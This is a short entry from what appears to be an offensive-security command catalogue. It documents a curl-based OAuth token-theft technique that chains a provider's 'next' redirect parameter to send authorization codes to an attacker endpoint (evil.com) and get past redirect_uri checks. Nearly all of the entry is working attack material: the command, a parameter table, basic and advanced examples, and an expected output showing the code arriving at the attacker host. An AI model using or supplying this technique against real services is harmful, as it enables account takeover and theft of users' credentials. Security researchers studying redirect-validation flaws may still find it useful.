---
type: command
executor: bash
data: >-
  curl
  "https://www.example.com/oauth20_authorize.srf?client_id=$_CLIENT_ID&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=$_MALICIOUS_URI&scope=$_SCOPE&response_type=code"
output: null
platforms:
  - Web
tags:
  - oauth
  - token-theft
verified: true
validated: true
---

# curl-oauth-authorize-chained-redirect

## Command

```bash
curl "https://www.example.com/oauth20_authorize.srf?client_id=$_CLIENT_ID&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=$_MALICIOUS_URI&scope=$_SCOPE&response_type=code"
```

## Description

This command exploits nested redirect chains in OAuth endpoints, using a 'next' parameter in a provider's callback to route the token to an attacker site, bypassing simple URI validations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_CLIENT_ID | Client ID for the app | Yes |
| $_MALICIOUS_URI | Final attacker endpoint (e.g., 'https://evil.com') | Yes |
| $_SCOPE | Requested scopes | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.example.com/oauth20_authorize.srf?client_id=myapp&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com&scope=openid&response_type=code"
```

### Advanced Usage

```bash
curl "https://www.example.com/oauth20_authorize.srf?client_id=myapp&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com/capture&scope=openid email&response_type=code"
```

## Expected Output

Multi-stage 302 redirects ending at $_MALICIOUS_URI with the code or token. Example: Final Location: https://evil.com?code=ghi789

## Related

- [[procedures/OAuth-Token-Theft-via-Redirect-URI]]
